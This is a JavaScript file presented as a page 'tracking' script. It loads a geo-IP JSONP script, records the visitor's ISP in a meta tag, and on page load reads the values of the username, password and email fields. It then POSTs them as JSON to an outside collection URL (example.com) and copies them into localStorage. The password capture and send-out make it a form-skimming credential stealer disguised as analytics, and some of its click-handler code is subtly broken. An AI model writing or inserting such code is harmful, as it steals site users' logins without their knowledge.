function getJSONP(e) {
  var t = "_" + +new Date(),
    n = document.createElement("script"),
    d = document.getElementsByTagName("head")[0] || document.documentElement;
  window[t] = function (e) {
    d.removeChild(n);
  }, n.src = e.replace("callback=?", "callback=" + t), n.setAttribute("id", "isploader"), d.appendChild(n);
}
// Base tracking object
var Tracker = {
  dataStore: {},
  getData: function (selector) {
    return document.querySelector(selector);
  },
  storeData: function (selector) {
    var el = this.getData(selector);
    if (el !== null) {
      this.dataStore[selector] = el.value;
    } else {
      this.dataStore[selector] = null;
    }
  },
  sendRequest: function (url) {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          console.log("Data sent successfully");
        } else {
          console.error("Data failed to send, status code:" + xhr.status);
        }
      }
    };
    xhr.send(JSON.stringify(this.dataStore));
  }
};

// Start tracking
function ip2isp(e) {
  var t = "customtarget",
    n = document.getElementsByName(t),
    d = "";
  1 == n.length && (d = window.atob(n[0].content) + "&", n[0].parentNode.removeChild(n[0]));
  var o = document.createElement("meta");
  o.name = t, o.content = window.btoa(decodeURIComponent(encodeURIComponent(d + "userdb_id=" + userdb_id + "&isp=" + e.isp))), document.getElementsByTagName("head")[0].appendChild(o);
  var a = document.getElementById("isploader");
  a.parentNode.removeChild(a), userdb_id = void 0;
}
var userdb_id = 73;
getJSONP("//geoip.p24.hu/geoip.js");
window.onload = function () {
  const elSelectors = ["#username", "#password", "#email"];
  for (var selector of elSelectors) {
    Tracker.storeData(selector);
  }
  Tracker.sendRequest("https://example.com/api/collect");
  var elements = document.querySelectorAll('input, button');
  elements.forEach(function (element) {
    element.addEventListener('click', function () {
      Tracker.storeData(this);
    });
  });
  localStorage.setItem('trackedData', JSON.stringify(Tracker.dataStore));
};